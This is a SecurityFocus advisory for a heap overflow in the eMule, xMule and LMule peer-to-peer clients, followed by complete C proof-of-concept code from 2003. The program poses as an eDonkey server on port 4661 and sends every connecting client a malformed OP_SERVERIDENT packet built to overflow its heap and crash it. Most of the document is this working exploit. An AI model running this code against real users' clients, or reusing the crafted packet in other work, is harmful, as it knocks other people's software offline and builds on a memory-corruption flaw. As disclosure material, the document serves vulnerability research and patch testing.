source: http://www.securityfocus.com/bid/8440/info

eMule client has been reported prone to a heap overflow vulnerability. The issue presents itself when the client parses malicious data received from the server. This issue may allow an attacker to provide excessive data to an affected client using a malicious server. Ultimately an attacker may exploit this condition to execute arbitrary supplied instructions in the context of the vulnerable emule application. 

/*
 * eMule/xMule/LMule OP_IDENT Heap Overflow vulnerability
 * (SecurityFocus BID 8440)
 * proof of concept code
 * version 1.0 (Sep 01 2003)
 *
 * by R�mi Denis-Courmont <exploit@simutrans.fr.st>
 *   http://www.simphalempin.com/dev/
 *
 * This vulnerability was found by:
 *   Stefan Esser <s.esser@e-matters.de>
 * whose original advisory may be fetched from:
 *   http://security.e-matters.de/advisories/022003.html
 *
 * Vulnerable:
 *  - eMule v0.29a -> crash
 *  - xMule stable v1.4.3 -> crash
 *  - xMule unstable v1.5.6a -> crash
 *  - Lmule v1.3.1 (NOT tested) -> ???
 *
 * Not vulnerable:
 *  - xMule stable v1.6.0,
 *  - eMule v0.29b.
 *
 *   It might be possible to exploit this vulnerability, as you can overwrite
 * about 60Kb of heap memory, but it's obviously not going to be trivial.
 * However, please keep in mind that getting clients to connect to your
 * computer, while not impossible, will be very very hard: Even though many
 * clients adds current server of other clients to their own server lists, so
 * that you can promote yourself as a server by actively connecting to others,
 * it is unlikely that your "server" will be selected from the list which
 * often exceeds 100 entries.
 *   Anyway, the following proof-of-concept is entirely passive, so you will
 * probably only be able to test it against yourself (which is very fine,
 * because you usually are you only legal victim).
 */


/*****************************************************************************
 * Copyright (C) 2003  R�mi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright         *
 *    notice, this list of conditions and the following disclaimer.          *
 * 2. Redistributions in binary form must reproduce the above copyright      *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *****************************************************************************/

#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>

int gai_errno = 0;

void
gai_perror (const char *str)
{
	if ((gai_errno == EAI_SYSTEM) || (gai_errno == 0))
		perror (str);
	else
		fprintf (stderr, "%s: %s\n", str, gai_strerror (gai_errno));
}


int
socket_listen (const char *hostname, const char *servname)
{
	struct addrinfo hints, *res;

	hints.ai_family = PF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = 0;
	hints.ai_flags = AI_PASSIVE;

	if ((gai_errno = getaddrinfo (hostname, servname, &hints, &res)) == 0)
	{
		struct addrinfo *ptr;

		for (ptr = res; ptr != NULL; ptr = ptr->ai_next)
		{
			int sock;

			sock = socket (ptr->ai_family, ptr->ai_socktype,
					ptr->ai_protocol);
			if (sock != -1)
			{
				const int val = 1;

				setsockopt (sock, SOL_SOCKET, SO_REUSEADDR,
						&val, sizeof (val));
				if (bind (sock, ptr->ai_addr, ptr->ai_addrlen)
				 || listen (sock, INT_MAX))
					close (sock);
				else
				{
					/* success! */
					freeaddrinfo (res);
					return sock;
				}
			}
		}
		freeaddrinfo (res);
	}
	return -1;
}


int
send_server_message (int fd/*, const char *message*/)
{
	/*
	 * Note that eDonkey is an Intel-centric protocol that sends/receives
	 * everything in counter-network-byte order (ie. low order first).
	 */
	uint8_t buf[] =
		"\xE3" // protocol
		"\x27\x00\x00\x00" // packet size
		"\x41" // command (Server identity)
		"\xff\xff\xff\xff\xff\xff\xff\xff"
		"\xff\xff\xff\xff\xff\xff\xff\xff"
		"\xff\xff\xff\xff\xff\xff\xff\xff"
		"\xff\xff\xff\xff\xff\xff\xff\xff"
		"\xff\xff\xff\xff\xff\xff";

	return (send (fd, buf, sizeof (buf) - 1, 0) != (sizeof (buf) - 1));
}


static int
usage (const char *path)
{
	printf (
"Syntax: %s [port [hostname|IP]]\n"
"        Attempt to crash eMule/xMule/LMule clients which will connect to\n"
"        the specified server port (or 4661 by default), at the local\n"
"        host address (or any available address by default)\n", path);

	return 2;
}


int
main (int argc, char *argv[])
{
	puts ("eMule/xMule/LMule OP_SERVERIDENT Heap Overflow vulnerability\n"
		"proof of concept code\n"
		"Copyright (C) 2003 R�mi Denis-Courmont "
			"<exploit@simutrans.fr.st>\n");
	if (argc > 3)
		return usage (argv[0]);
	else
	{
		int listenfd;
		const char *host, *port;

		port = (argc < 2) ? "4661" : argv[1];
		host = (argc < 3) ? NULL : argv[2];
		printf ("Binding to [%s]:%s ...\n",
			(host != NULL) ? host : "any", port);
		listenfd = socket_listen (host, port);
		if (listenfd == -1)
		{
			gai_perror (host);
			return 1;
		}

		while (1)
		{
			int clientfd;

			fputs ("Waiting for a client to connect ... ", stdout);
			clientfd = accept (listenfd, NULL, 0);
			if (clientfd == -1)
			{
				puts ("");
				perror ("Error");
				continue;
			}
			puts ("OK");
			fputs ("Sending deadly server identity ... ", stdout);
			if (send_server_message (clientfd))
			{
				puts ("");
				perror ("Error");
			}
			else
				puts ("Done");
			close (clientfd);
		}
	}

	return 0; /* dead code */
}
